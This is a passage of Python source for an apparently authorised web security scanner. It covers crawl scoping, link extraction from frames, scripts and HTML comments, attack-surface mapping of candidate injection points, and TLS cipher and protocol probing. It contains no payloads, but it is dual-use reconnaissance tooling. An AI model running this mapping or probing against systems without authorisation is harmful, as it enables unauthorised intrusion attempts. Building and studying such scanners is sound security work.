            # rare TLDs; the engineer should verify in the report.)
            self.registrable_domain = ".".join(labels[-3:])
        self.robots = RobotsParser(logger)

    # --- Scope decision logic ---------------------------------------------

    def _in_target_domain(self, url: str) -> bool:
        """Return True if `url`'s host+port matches the target.

        Port checking: if the target URL explicitly specified a port
        (e.g. http://target:4280/), we require the URL to be on the
        SAME port. If the target URL didn't specify a port (e.g.
        http://target/), we only check the hostname (standard ports
        80/443 are assumed).
        """
        try:
            parsed_url = urlparse(url)
            host = parsed_url.hostname or ""
            port = parsed_url.port  # None if not in URL
        except Exception:
            return False

        # --- Host check ---
        if host == self.target_host:
            # Host matches — now check port
            if self.target_port is not None:
                # Target explicitly specified a port — URL must match it
                # (or use the same default port)
                url_port = port or (443 if parsed_url.scheme == "https" else 80)
                if url_port != self.target_port:
                    return False  # different port → out of scope
            return True

        # Allow subdomains of the registrable domain (e.g. api.example.com
        # when target is www.example.com). Port handling depends on whether
        # the target specified a port:
        #   - Target had NO explicit port → accept subdomains on any port
        #     (preserves the original permissive behaviour for the common
        #     default-port case).
        #   - Target HAD an explicit port → accept subdomains only on the
        #     SAME port. Previously this branch rejected ALL subdomains when
        #     the target had a port, which meant scanning
        #     https://app.example.com:8443 excluded https://api.example.com:8443
        #     (a same-port subdomain service) — that was the bug.
        if host.endswith("." + self.registrable_domain):
            if self.target_port is None:
                return True
            url_port = port or (443 if parsed_url.scheme == "https" else 80)
            if url_port == self.target_port:
                return True

        return False

    def _path_matches_scope(self, url: str) -> bool:
        """Return True if `url`'s path matches at least one --scope pattern.

        If --scope was not provided, all in-domain paths are in scope
        (subject to --exclude and robots.txt).
        """
        if not self.scope_patterns:
            return True
        path = urlparse(url).path or "/"
        # We use fnmatch which supports shell-style globs (*, ?, [seq]).
        # The patterns are matched against the path AND the full URL so
        # the engineer can scope by query string if needed.
        for pat in self.scope_patterns:
            if fnmatch.fnmatch(path, pat) or fnmatch.fnmatch(url, pat):
                return True
        return False

    def _path_matches_exclude(self, url: str) -> bool:
        """Return True if `url` matches any --exclude pattern.

        Excluded URLs are NEVER fuzzed, but they MAY still be crawled
        (we just don't send payloads to them). The orchestrator checks
        this flag before deciding to fuzz.
        """
        path = urlparse(url).path or "/"
        for pat in self.exclude_patterns:
            if fnmatch.fnmatch(path, pat) or fnmatch.fnmatch(url, pat):
                return True
        return False

    def _is_crawlable(self, url: str) -> bool:
        """Combine all scope checks into a single go/no-go decision."""
        # 1. Skip non-http(s) schemes (mailto:, javascript:, tel:, ...).
        if not url.startswith(("http://", "https://")):
            return False
        # 2. Domain restriction unless --allow-external.
        if not self.allow_external and not self._in_target_domain(url):
            return False
        # 3. --scope allow-patterns.
        if not self._path_matches_scope(url):
            return False
        # 4. robots.txt (unless --ignore-robots).
        if not self.ignore_robots and not self.robots.is_allowed(url):
            return False
        return True

    def _is_fuzzable(self, url: str) -> bool:
        """A URL is fuzzable iff it is crawlable AND not excluded."""
        return self._is_crawlable(url) and not self._path_matches_exclude(url)

    # --- Link extraction from the DOM -------------------------------------

    async def _extract_links(self, page: Page, source_url: str) -> List[Tuple[str, str]]:
        """Return (absolute_url, source_tag) tuples found on `page` AND its
        child iframes.

        Many authenticated apps (portals, admin shells, Microsoft/SSO landing
        pages) embed their real navigation in an <iframe> on the side. The
        main-frame DOM only shows the <iframe> tag — its links/forms/scripts
        are invisible unless we recurse into the child frames. We extract
        from every child frame (best-effort; cross-origin/destroyed frames
        are skipped) — extracted links still pass the scope check, so only
        in-scope URLs are actually crawled.
        """
        found: List[Tuple[str, str]] = []
        # Main frame.
        found.extend(await self._extract_from_frame(page, source_url))
        # Child iframes. page.frames includes the main frame — skip it.
        frames = getattr(page, "frames", None) or []
        main_frame = getattr(page, "main_frame", None)
        for fr in frames:
            try:
                if fr is main_frame:
                    continue
                fr_url = getattr(fr, "url", "") or ""
                # Skip blank/non-http frames (about:blank, blob:, data:).
                if not fr_url or fr_url.startswith(("about:", "blob:", "data:")):
                    continue
                found.extend(await self._extract_from_frame(fr, fr_url))
            except Exception:
                # Cross-origin or already-destroyed frame — skip silently.
                continue
        return found

    async def _extract_from_frame(self, frame: Any, source_url: str) -> List[Tuple[str, str]]:
        """Extract <a>/<form>/inline-script/comment URLs from ONE frame (the
        main page or a child iframe). Both Page and Frame expose
        eval_on_selector_all / evaluate, so the same body works for either.

        We look for:
          - <a href>
          - <form action>
          - window.location assignments in inline <script>
          - fetch() and XMLHttpRequest calls in inline <script>

        WHY INLINE SCRIPT ONLY: Extracting URLs from external JS bundles
        would require fetching and parsing them, which expands scope
        significantly and risks hitting CDNs. Inline scripts are usually
        where the app's routing logic lives for SPAs.
        """
        found: List[Tuple[str, str]] = []

        # --- <a href> ---
        # We use page.eval_on_selector_all to run a DOM query inside the
        # browser context. This is faster than round-tripping each element
        # through Playwright's Python API. (`frame` here is the main page OR
        # a child iframe — both support eval_on_selector_all.)
        a_hrefs = await _pw(frame.eval_on_selector_all,
            "a[href]",
            """els => els.map(e => e.getAttribute('href'))""",
            default=[],
        )
        for href in a_hrefs:
            if not href:
                continue
            # urljoin handles relative URLs, parent-dir traversal (../),
            # and absolute paths correctly. It also leaves absolute URLs
            # (http://...) unchanged.
            abs_url = urljoin(source_url + "#", href.split("#")[0])
            found.append((abs_url, "a_href"))

        # --- <form action> ---
        # Forms also give us the HTTP method, which we record so the
        # orchestrator knows to fuzz via POST (not just GET).
        form_data = await _pw(frame.eval_on_selector_all,
            "form",
            """els => els.map(e => ({
                action: e.getAttribute('action') || '',
                method: (e.getAttribute('method') || 'GET').toUpperCase()
            }))""",
            default=[],
        )
        for f in form_data:
            action = f.get("action") or source_url
            abs_url = urljoin(source_url + "#", action.split("#")[0])
            # Encode the method into the source tag so the caller knows.
            found.append((abs_url, f"form_action:{f.get('method', 'GET')}"))

        # --- Inline <script> window.location / fetch / XHR ---
        # We extract string literals from inline scripts using a regex.
        # This is heuristic — it WILL miss dynamically constructed URLs
        # and URLs in external bundles. The engineer should treat the
        # crawl map as a starting point, not exhaustive.
        scripts = await _pw(frame.eval_on_selector_all,
            "script:not([src])",
            "els => els.map(e => e.textContent || '')",
            default=[],
        )
        # Regex explanation:
        #   window.location\s*[=.]\s*['"]([^'"]+)['"]
        #     matches: window.location = '/login'  OR  window.location.href='/x'
        #   fetch\s*\(\s*['"]([^'"]+)['"]
        #     matches: fetch('/api/users')  OR  fetch("https://...")
        #   \.open\s*\(\s*['"][A-Z]+['"]\s*,\s*['"]([^'"]+)['"]
        #     matches: xhr.open('GET', '/api/data')
        url_in_script = re.compile(
            r"(?:window\.location(?:\.\w+)?\s*[=.]\s*['\"]([^'\"]+)['\"]"
            r"|fetch\s*\(\s*['\"]([^'\"]+)['\"]"
            r"|\.open\s*\(\s*['\"][A-Z]+['\"]\s*,\s*['\"]([^'\"]+)['\"])"
        )
        for script_text in scripts:
            for m in url_in_script.finditer(script_text):
                # The regex has three alternative capture groups; pick the
                # one that matched (whichever is not None).
                rel = next(g for g in m.groups() if g)
                abs_url = urljoin(source_url + "#", rel.split("#")[0])
                found.append((abs_url, "js_extract"))

        # --- HTML comments ---
        # Extract URLs from <!-- ... --> comments. Developers often leave
        # commented-out links, debug endpoints, or internal paths in HTML
        # comments (e.g. <!-- <a href="/admin/"> --> or <!-- /api/v2/ -->).
        # Standard recon tools (Burp, ZAP) do this — our crawler should too.
        # Uses a TreeWalker to efficiently collect comment text from the DOM.
        comment_texts = await _pw(frame.evaluate,
            """() => {
                const out = [];
                const w = document.createTreeWalker(document, NodeFilter.SHOW_COMMENT);
                while (w.nextNode()) out.push(w.currentNode.textContent || '');
                return out;
            }""",
            default=[],
        )
        # Match URLs in comments:
        #   1. href="..." / src="..." / action="..." (commented-out HTML tags)
        #   2. Absolute paths like /admin/ or /api/v2/users (3+ chars)
        #   3. Full URLs http(s)://...
        comment_href_re = re.compile(
            r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', re.I,
        )
        comment_path_re = re.compile(
            r'(?<!\w)(/[A-Za-z][\w\-./]{2,})',
        )
        comment_full_re = re.compile(
            r'https?://[^\s"\'<>]+',
        )
        comment_urls_seen: Set[str] = set()
        for ct in comment_texts:
            if not ct:
                continue
            # Collect all URL-like strings from this comment.
            candidates: List[str] = []
            for m in comment_href_re.finditer(ct):
                candidates.append(m.group(1))
            for m in comment_full_re.finditer(ct):
                candidates.append(m.group(0))
            for m in comment_path_re.finditer(ct):
                candidates.append(m.group(1))
            for rel in candidates:
                # Skip obviously non-URL strings (file extensions, CSS values).
                if rel.endswith((".css", ".js")) and "/" not in rel[:-4]:
                    continue
                abs_url = urljoin(source_url + "#", rel.split("#")[0])
                if abs_url in comment_urls_seen:
                    continue
                comment_urls_seen.add(abs_url)
                found.append((abs_url, "html_comment"))

        return found

    # --- Main BFS crawl ---------------------------------------------------

    async def crawl(
        self,
        page: Page,
        output_dir: Path,
    ) -> List[CrawledURL]:
        """Run the BFS crawl. Returns the deduplicated crawl map."""
        # Fetch robots.txt first (so scope checks can use it).
        if not self.ignore_robots:
            await self.robots.fetch(self.target_url, page)

        # The BFS frontier. We use a deque for O(1) popleft.
        # Each entry is (url, depth, source).
        frontier: deque = deque([(self.target_url, 0, "seed")])
        visited: Set[str] = set()
        results: List[CrawledURL] = []

        while frontier and not GLOBAL_STATE.stop_event.is_set():
            url, depth, source = frontier.popleft()
            # Normalise URL: strip fragment, lowercase the host for dedup.
            # We do NOT strip query string — it's significant for fuzzing.
            norm = self._normalise(url)
            if norm in visited:
                continue
            visited.add(norm)

            # Decide crawlability and fuzzability up front so we record
            # the decision in the crawl map for the engineer's audit.
            crawlable = self._is_crawlable(norm)
            fuzzable = self._is_fuzzable(norm)
            results.append(CrawledURL(
                url=norm,
                depth=depth,
                source=source,
                in_scope=fuzzable,  # 'in_scope' = will be fuzzed
            ))
            self.logger.log(
                "crawl_visit",
                f"depth={depth} source={source} url={norm} "
                f"crawlable={crawlable} fuzzable={fuzzable}",
            )

            # Don't recurse beyond max_depth or into out-of-scope URLs.
            if depth >= self.max_depth or not crawlable:
                continue

            # Rate-limit before navigation.
            async with self.rate_limiter.slot():
                try:
                    await _pw(page.goto, norm, wait_until="domcontentloaded",
                                    timeout=15000, default=None)
                    # Give the page a moment to render (SPAs may need it).
                    await asyncio.sleep(0.5)
                except PWTimeoutError:
                    self.logger.log("crawl_visit",
                                    f"timeout loading {norm}; skipping children")
                    continue
                except Exception as e:
                    self.logger.log("crawl_visit",
                                    f"error loading {norm}: {e}")
                    continue

                # Extract child links.
                try:
                    children = await self._extract_links(page, norm)
                except Exception as e:
                    self.logger.log("crawl_extract",
                                    f"link extraction failed on {norm}: {e}")
                    continue

            for child_url, child_source in children:
                child_norm = self._normalise(child_url)
                if child_norm in visited:
                    continue
                # Parse out the form method if the source carries one.
                if child_source.startswith("form_action:"):
                    method = child_source.split(":", 1)[1]
                else:
                    method = "GET"
                # Stash the method on the frontier so it survives to the
                # CrawledURL record. We piggy-back on the source string.
                frontier.append((child_url, depth + 1, child_source))

        # Save the crawl map for the engineer to review BEFORE fuzzing.
        crawl_map_path = output_dir / "crawl_map.json"
        crawl_map_path.parent.mkdir(parents=True, exist_ok=True)
        crawl_map_path.write_text(
            json.dumps([asdict(r) for r in results], indent=2,
                       ensure_ascii=False, default=str),
            encoding="utf-8",
        )
        self.logger.log(
            "crawl_done",
            f"visited {len(results)} URLs; map saved to {crawl_map_path.name}",
        )
        return results

    def _normalise(self, url: str) -> str:
        """Normalise a URL for deduplication.

        - Strip the fragment (#...).
        - Lowercase the scheme and host (paths are case-sensitive).
        - Remove trailing slash from root paths (but keep /foo/ distinct
          from /foo — these can be different routes in some frameworks).
        """
        try:
            parsed = urlparse(url)
        except Exception:
            return url
        scheme = parsed.scheme.lower()
        netloc = parsed.netloc.lower()
        path = parsed.path or "/"
        if path != "/" and path.endswith("/"):
            # Strip trailing slash EXCEPT for root.
            path = path.rstrip("/")
        # Reassemble without the fragment.
        query = f"?{parsed.query}" if parsed.query else ""
        return f"{scheme}://{netloc}{path}{query}"


# ============================================================================
# SECTION 11 — ATTACK SURFACE MAPPER ("Locations")
# ============================================================================
#
# The Attack Surface Mapper enumerates every user-controllable input the
# crawler discovered, so the active scanner has a concrete list of injection
# points to test. It produces:
#   - form fields (name, type, current value, form method/action)
#   - URL query parameters (from <a href> links and from the current URL)
#   - fetch()/XHR body parameters (parsed from inline scripts where possible)
#   - custom application headers expected by the JS (best-effort)
#
# CRITICAL DISCLAIMER in the report: "These are SUGGESTED injection points.
# The engineer must manually decide which to test." We do not auto-fuzz
# every input — that would be reckless on production targets.

class AttackSurfaceMapper:
    """Identify and catalogue user-controllable inputs on a set of pages."""

    def __init__(self, logger: ExecutionTrailLogger) -> None:
        self.logger = logger

    async def map_page(self, page: Page, url: str) -> List[InputField]:
        """Return all inputs discoverable on `url` via the DOM + inline JS."""
        inputs: List[InputField] = []

        # --- 1. <form> fields ---
        # We extract each form's action, method, and a list of its inputs.
        # The eval runs entirely in the browser, returning a JSON-serialisable
        # structure — much faster than calling page.query_selector for each.
        forms = await _pw(page.eval_on_selector_all,
            "form",
            """forms => forms.map(f => {
                const inputs = Array.from(f.querySelectorAll('input, textarea, select, button'))
                    .map(i => ({
                        name: i.name || i.id || '',
                        type: (i.type || i.tagName.toLowerCase()),
                        value: (i.value || '')
                    }));
                return {
                    action: f.getAttribute('action') || location.href,
                    method: (f.getAttribute('method') || 'GET').toUpperCase(),
                    inputs: inputs
                };
            })""",
            default=[],
        )
        for form in forms:
            action = urljoin(url + "#", form["action"].split("#")[0])
            for inp in form["inputs"]:
                if not inp["name"]:
                    # Inputs without a name are not submitted — skip them.
                    # (They may still be useful for DOM-based XSS, but we
                    # limit our catalogue to server-receivable inputs.)
                    continue
                inputs.append(InputField(
                    location="form",
                    url=action,
                    method=form["method"],
                    name=inp["name"],
                    input_type=inp["type"],
                    current_value=inp["value"],
                ))

        # --- 2. URL query parameters ---
        # We look at the current page URL AND any <a href> with a query
        # string. The latter is important because the engineer may want
        # to test parameters that appear only in linked URLs, not the
        # current page.
        parsed = urlparse(url)
        for name, values in parse_qs(parsed.query).items():
            inputs.append(InputField(
                location="url_param",
                url=url,
                method="GET",
                name=name,
                input_type="query",
                current_value=values[0] if values else "",
            ))
        # Linked URLs with query strings.
        a_hrefs = await _pw(page.eval_on_selector_all,
            "a[href]",
            "els => els.map(e => e.href)",
            default=[],
        )
        for href in a_hrefs:
            if not href:
                continue
            q = urlparse(href).query
            if not q:
                continue
            for name, values in parse_qs(q).items():
                inputs.append(InputField(
                    location="url_param",
                    url=href,
                    method="GET",
                    name=name,
                    input_type="query_link",
                    current_value=values[0] if values else "",
                ))

        # --- 3. fetch() / XHR body parameters (best-effort) ---
        # We scan inline <script> for fetch(...) calls and try to extract
        # the body argument. This is HEURISTIC — JavaScript allows many
        # ways to construct a fetch call, and we'll only catch the literal
        # forms. The engineer should treat this as a hint, not exhaustive.
        scripts = await _pw(page.eval_on_selector_all,
            "script:not([src])",
            "els => els.map(e => e.textContent || '')",
            default=[],
        )
        # Match: fetch('url', { method: 'POST', body: '...' })
        # OR:    fetch('url', { method: 'POST', body: JSON.stringify({a:1,b:2}) })
        # We capture the URL and any literal 'key=value' or JSON keys.
        fetch_re = re.compile(
            r"fetch\s*\(\s*['\"]([^'\"]+)['\"]\s*,\s*\{([^}]*)\}",
            re.IGNORECASE | re.DOTALL,
        )
        for script_text in scripts:
            for m in fetch_re.finditer(script_text):
                fetch_url = urljoin(url + "#", m.group(1).split("#")[0])
                opts = m.group(2)
                method_m = re.search(r"method\s*:\s*['\"]([A-Z]+)['\"]",
                                     opts, re.IGNORECASE)
                method = method_m.group(1).upper() if method_m else "GET"
                # Look for body: 'key=value&...' (URL-encoded form)
                body_m = re.search(r"body\s*:\s*['\"]([^'\"]+)['\"]", opts)
                if body_m:
                    body = body_m.group(1)
                    for name, values in parse_qs(body).items():
                        inputs.append(InputField(
                            location="fetch_body",
                            url=fetch_url,
                            method=method,
                            name=name,
                            input_type="fetch_body",
                            current_value=values[0] if values else "",
                        ))
                # Look for body: JSON.stringify({...}) — extract bare keys.
                json_m = re.search(
                    r"body\s*:\s*JSON\.stringify\s*\(\s*\{([^}]*)\}",
                    opts, re.DOTALL,
                )
                if json_m:
                    keys = re.findall(r"['\"]?(\w+)['\"]?\s*:", json_m.group(1))
                    for k in keys:
                        inputs.append(InputField(
                            location="fetch_body",
                            url=fetch_url,
                            method=method,
                            name=k,
                            input_type="fetch_json_key",
                            current_value="",
                        ))

        # --- 4. Custom expected headers (best-effort) ---
        # Some apps set custom headers (e.g. X-CSRF-Token) in JS. We scan
        # for `headers: { 'X-...': ... }` blocks in fetch calls.
        for script_text in scripts:
            for hdr_m in re.finditer(
                r"headers\s*:\s*\{([^}]*)\}", script_text, re.DOTALL,
            ):
                hdrs = hdr_m.group(1)
                for name_m in re.finditer(r"['\"](X-[^'\"]+)['\"]", hdrs):
                    inputs.append(InputField(
                        location="custom_header",
                        url=url,
                        method="ANY",
                        name=name_m.group(1),
                        input_type="custom_header",
                        current_value="",
                    ))

        # Deduplicate by (location, url, method, name).
        seen: Set[Tuple[str, str, str, str]] = set()
        unique: List[InputField] = []
        for inp in inputs:
            key = (inp.location, inp.url, inp.method, inp.name)
            if key in seen:
                continue
            seen.add(key)
            unique.append(inp)
        return unique

    async def map_all(
        self,
        page: Page,
        crawl_map: List[CrawledURL],
        output_dir: Path,
    ) -> List[InputField]:
        """Visit each in-scope URL in the crawl map and collect inputs."""
        all_inputs: List[InputField] = []
        for cu in crawl_map:
            if GLOBAL_STATE.stop_event.is_set():
                break
            if not cu.in_scope:
                continue
            try:
                await _pw(page.goto, cu.url, wait_until="domcontentloaded",
                                timeout=15000, default=None)
                await asyncio.sleep(0.3)
                page_inputs = await self.map_page(page, cu.url)
                all_inputs.extend(page_inputs)
                self.logger.log(
                    "attack_surface",
                    f"url={cu.url} inputs_found={len(page_inputs)}",
                )
            except Exception as e:
                self.logger.log("attack_surface",
                                f"failed to map {cu.url}: {e}")

        # Save the structured catalogue.
        out_path = output_dir / "attack_surface.json"
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(
            json.dumps([asdict(i) for i in all_inputs], indent=2,
                       ensure_ascii=False, default=str),
            encoding="utf-8",
        )
        self.logger.log(
            "attack_surface_done",
            f"total inputs={len(all_inputs)}; saved to {out_path.name}",
        )
        return all_inputs


# ============================================================================
# SECTION 12 — SSL/TLS INSPECTOR
# ============================================================================
#
# Playwright does NOT expose the negotiated cipher suite or certificate
# chain — it only tells us whether the connection succeeded. To inspect
# the certificate and the negotiated protocol/cipher, we drop down to
# Python's stdlib `ssl` module and open a raw TLS connection to the
# target. This gives us:
#   - The full certificate (subject, issuer, validity, SANs).
#   - The negotiated cipher suite and TLS protocol version.
#   - The trust-chain validation result (untrusted root, expired, etc.).
#
# We then save the full certificate chain in PEM format to the evidence
# folder so the engineer can inspect it with `openssl x509 -text` or
# import it into other tooling.

class SSLInspector:
    """Inspects the target's TLS certificate and negotiated cipher suite."""

    def __init__(self, logger: ExecutionTrailLogger) -> None:
        self.logger = logger

    def inspect(self, url: str, output_dir: Path) -> SSLRecord:
        """Open a raw TLS connection and extract certificate details.

        We do NOT use Playwright here because we need low-level access
        to the SSLContext and the negotiated cipher. This is a deliberate
        architectural split: Playwright for DOM/JS work, stdlib ssl for
        crypto inspection.
        """
        parsed = urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        record = SSLRecord(hostname=host, port=port)

        if parsed.scheme != "https":
            # Non-HTTPS targets have no TLS to inspect. We return an empty
            # record with hostname/port filled in so the report can still
            # display the row.
            self.logger.log("ssl_inspect",
                            "non-HTTPS target; skipping TLS inspection")
            return record

        # --- Build a permissive SSLContext so we can inspect even
        # invalid/self-signed certs. We do NOT verify by default because
        # we want to capture the certificate even if the chain is broken.
        # We DO perform manual verification afterwards and record the result.
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        # We allow all protocols so we can DETECT weak ones (TLS 1.0/1.1).
        # If we restricted the context to TLS 1.2+, we wouldn't see whether
        # the server would have negotiated a weaker protocol with a weaker
        # client — which is exactly what an attacker would target.
        ctx.minimum_version = ssl.TLSVersion.TLSv1
        # We set a short timeout so a hung server doesn't block the scan.
        sock_timeout = 10.0

        # Capture the negotiated cipher and protocol.
        negotiated_cipher = ""
        negotiated_protocol = ""
        pem_chain_parts: List[str] = []
        der_certs: List[bytes] = []

        try:
            with socket.create_connection((host, port), timeout=sock_timeout) as raw_sock:
                with ctx.wrap_socket(raw_sock, server_hostname=host) as ssock:
                    # ssock.version() returns e.g. 'TLSv1.3'
                    negotiated_protocol = ssock.version() or ""
                    # ssock.cipher() returns a tuple (name, version, secret_bits).
                    cipher_tuple = ssock.cipher()
                    if cipher_tuple:
                        negotiated_cipher = cipher_tuple[0]
                    # get_unverified_chain() returns the cert chain as the
                    # server presented it, in DER form, without validation.
                    # We use get_unverified_chain_bytes (Py 3.13+) if
                    # available, falling back to get_unverified_chain().
                    if hasattr(ssock, "get_unverified_chain_bytes"):
                        der_certs = list(ssock.get_unverified_chain_bytes())
                    elif hasattr(ssock, "get_unverified_chain"):
                        chain = ssock.get_unverified_chain()
                        if chain:
                            der_certs = []
                            for c in chain:
                                if isinstance(c, bytes):
                                    # Already DER bytes (some Python versions)
                                    der_certs.append(c)
                                elif hasattr(c, "public_bytes"):
                                    # Certificate object — convert to DER
                                    der_certs.append(
                                        c.public_bytes(ssl.ENCODING_DER))
                                else:
                                    # Unknown type — skip
                                    pass
                        else:
                            der_certs = []
                    else:
                        # Older Python: only the peer cert is available.
                        der_certs = [ssock.getpeercert(binary_form=True)] \
                            if ssock.getpeercert(binary_form=True) else []
        except socket.timeout:
            self.logger.log("ssl_inspect", f"timeout connecting to {host}:{port}")
            return record
        except ConnectionRefusedError:
            self.logger.log("ssl_inspect",
                            f"connection refused by {host}:{port}")
            return record
        except ssl.SSLError as e:
            # Some servers refuse TLS entirely (e.g. only speak HTTP).
            # We log and return the partial record.
            self.logger.log("ssl_inspect", f"SSL error: {e}")
            return record
        except Exception as e:
            self.logger.log("ssl_inspect", f"unexpected error: {e}")
            return record

        # --- Convert DER -> PEM and parse the leaf certificate ---
        # The PEM chain is what we save to disk for the engineer to inspect.
        import ssl as _ssl  # for DER_cert_to_PEM_cert
        for der in der_certs:
            pem = _ssl.DER_cert_to_PEM_cert(der)
            pem_chain_parts.append(pem)
        record.pem_chain = "".join(pem_chain_parts)

        # Parse the leaf certificate (first in the chain) for fields.
        if der_certs:
            try:
                # Use the cryptography library if available; otherwise fall
                # back to a manual ASN.1 parse. We try `cryptography` first
                # because it's already a transitive dep of Playwright in
                # most installations.
                try:
                    from cryptography import x509
                    from cryptography.hazmat.backends import default_backend
                    cert = x509.load_der_x509_certificate(
                        der_certs[0], default_backend(),
                    )
                    self._populate_from_cryptography(record, cert, host)
                except ImportError:
                    # Fall back to ssl.DER_cert_to_PEM_cert + manual text
                    # parse of `openssl x509 -text`-like output. We use
                    # Python's ssl module's text representation, which is
                    # not as rich but is always available.
                    self._populate_from_ssl_module(record, der_certs[0], host)
            except Exception as e:
                self.logger.log("ssl_inspect",
                                f"cert parse failed: {e}")

        # --- Check for weak ciphers and protocols (uses the editable policy) ---
        # bin/weak_ciphers.txt is the source of truth. Each match carries the
        # human-readable reason from the policy so the UI can show WHY a
        # cipher is flagged, not just that it is.
        for entry in WEAK_POLICY:
            if entry.kind != "cipher":
                continue
            matched = (
                entry.compiled_re.search(negotiated_cipher.lower())
                if (entry.match_mode == "re" and entry.compiled_re is not None)
                else entry.pattern.lower() in negotiated_cipher.lower()
            )
            if matched:
                record.weak_ciphers_detected.append(
                    f"{negotiated_cipher} ({entry.reason})"
                )
        for entry in WEAK_POLICY:
            # EXACT match, not substring. Protocol version strings are
            # hierarchical: "TLSv1" is a substring of "TLSv1.3", but they
            # are different versions. A substring check would falsely flag
            # TLS 1.2 / 1.3 as weak because "TLSv1" matches "TLSv1.2"/"TLSv1.3".
            if entry.kind == "tls" and \
                    entry.pattern.lower() == (negotiated_protocol or "").lower():
                record.weak_protocols_detected.append(
                    f"{negotiated_protocol} ({entry.reason})"
                )

        record.negotiated_cipher = negotiated_cipher
        record.negotiated_protocol = negotiated_protocol

        # --- Decode the full certificate chain (every cert, not just leaf) ---
        # Zero extra network impact — the chain was already captured above.
        self._decode_full_chain(record, der_certs)

        # --- testssl-style cipher-suite + protocol enumeration ---
        # Probes a curated ~30-cipher set to see what the server will accept.
        # This adds ~30 short TLS handshakes (50ms apart, ~15s hard cap). It
        # is wrapped so any failure leaves the rest of the record intact.
        self._probe_ciphers(host, port, record)

        # --- Save PEM chain to evidence folder ---
        pem_path = output_dir / "cert_chain.pem"
        pem_path.parent.mkdir(parents=True, exist_ok=True)
        pem_path.write_text(record.pem_chain, encoding="utf-8")
        accepted = sum(1 for c in record.supported_ciphers if c.get("accepted"))
        weak_accepted = sum(1 for c in record.supported_ciphers
                            if c.get("accepted") and c.get("strength") == "weak")
        self.logger.log(
            "ssl_inspect",
            f"protocol={negotiated_protocol} cipher={negotiated_cipher} "
            f"issuer={record.issuer!r} self_signed={record.is_self_signed} "
            f"expired={record.is_expired} "
            f"hostname_mismatch={record.hostname_mismatch} "
            f"weak_ciphers={len(record.weak_ciphers_detected)} "
            f"weak_protocols={len(record.weak_protocols_detected)} "
            f"chain_certs={len(record.cert_chain_details)} "
            f"probed={len(record.supported_ciphers)} accepted={accepted} "
            f"weak_accepted={weak_accepted} "
            f"pem_saved={pem_path.name}",
        )
        return record

    # --- Cipher-suite + protocol probing (testssl-style) -------------------

    # Curated probe list: (cipher_name, protocol_version_string). These are
    # the ciphers we ATTEMPT, one TLS handshake each. Whether an accepted
    # cipher is then flagged weak is decided by the editable WEAK_POLICY,
    # NOT by this list. Kept short (~25) on purpose to keep site impact low.
    # Cipher names are the standard OpenSSL TLS-1.2 suite names; TLS 1.3
    # cipher suites are not enumerated here (they are all AEAD, none weak).
    _CIPHER_PROBE_LIST: List[Tuple[str, str]] = [
        # No-encryption / export (the dangerous end)
        ("NULL-SHA",                "TLSv1.2"),
        ("NULL-SHA256",             "TLSv1.2"),
        ("RC4-MD5",                 "TLSv1.2"),
        ("RC4-SHA",                 "TLSv1.2"),
        ("DES-CBC-SHA",             "TLSv1.2"),
        ("DES-CBC3-SHA",            "TLSv1.2"),
        ("EDH-RSA-DES-CBC-SHA",     "TLSv1.2"),
        ("AES128-SHA",              "TLSv1.2"),   # CBC
        ("AES256-SHA",              "TLSv1.2"),   # CBC
        ("AES128-SHA256",           "TLSv1.2"),   # CBC
        ("AES256-SHA256",           "TLSv1.2"),   # CBC
        # Strong modern suites (the good end)
        ("AES128-GCM-SHA256",       "TLSv1.2"),
        ("AES256-GCM-SHA384",       "TLSv1.2"),
        ("ECDHE-RSA-AES128-SHA256", "TLSv1.2"),
        ("ECDHE-RSA-AES256-SHA384", "TLSv1.2"),
        ("ECDHE-RSA-AES128-GCM-SHA256", "TLSv1.2"),
        ("ECDHE-RSA-AES256-GCM-SHA384", "TLSv1.2"),
        ("ECDHE-RSA-CHACHA20-POLY1305", "TLSv1.2"),
    ]

    # TLS 1.3 cipher suites. These use a SEPARATE OpenSSL API
    # (SSLContext.set_ciphersuites) from TLS 1.2-and-below (set_ciphers) —
    # set_ciphers() does not control TLS 1.3 suites. All standard TLS 1.3
    # suites are AEAD (AES-GCM / ChaCha20-Poly1305), so none match the weak
    # policy; they show as "Strong". We still enumerate them so the cipher
    # table reflects what the server accepts over TLS 1.3 (otherwise the
    # table only shows TLS 1.2 rows even when the server negotiated 1.3).
    _TLS_1_3_CIPHERS: List[str] = [
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_128_CCM_SHA256",
    ]

    # Protocol-version probes. Each entry: (label, attribute_name_on_record,
    # ssl.TLSVersion min, ssl.TLSVersion max). We attempt one handshake with
    # the version pinned (any cipher the server likes) to see if the server
    # will speak that protocol at all. SSLv2/v3 are intentionally absent —
    # modern Python builds cannot negotiate them.
    _PROTO_PROBES: List[Tuple[str, str, Any, Any]] = []  # populated lazily

    def _proto_probe_table(self) -> List[Tuple[str, str, Any, Any]]:
        """Build (and cache) the protocol-probe table from ssl.TLSVersion.

        Done lazily because ssl.TLSVersion members may be missing on some
        builds (e.g. TLSv1_1 was deprecated and removed in Python 3.15-era
        OpenSSL builds). We only probe the versions actually present.
        """
        if self._PROTO_PROBES:
            return self._PROTO_PROBES
        V = ssl.TLSVersion
        candidates = [
            ("TLSv1",   "supports_tls_1_0", getattr(V, "TLSv1",   None)),
            ("TLSv1.1", "supports_tls_1_1", getattr(V, "TLSv1_1", None)),
            ("TLSv1.2", "supports_tls_1_2", getattr(V, "TLSv1_2", None)),
            ("TLSv1.3", "supports_tls_1_3", getattr(V, "TLSv1_3", None)),
        ]
        table = [(label, attr, lo, lo) for label, attr, lo in candidates
                 if lo is not None]
        self._PROTO_PROBES = table
        return table

    def _can_pin_tls13_cipher(self) -> bool:
        """True if this Python/OpenSSL build can pin ONE specific TLS 1.3 cipher.

        Required to enumerate TLS 1.3 cipher suites one at a time. Two paths:
          1. ssl.SSLContext.set_ciphersuites (preferred; Python 3.8+ with
             OpenSSL 1.1.1+). Present on most Linux/macOS builds.
          2. set_ciphers accepting a TLS 1.3 suite name (some builds merge
             the namespaces).

        Result is cached. When False, _probe_ciphers logs an explanation
        and the cipher table is TLS-1.2-only (the negotiated TLS 1.3 cipher
        is still captured separately).
        """
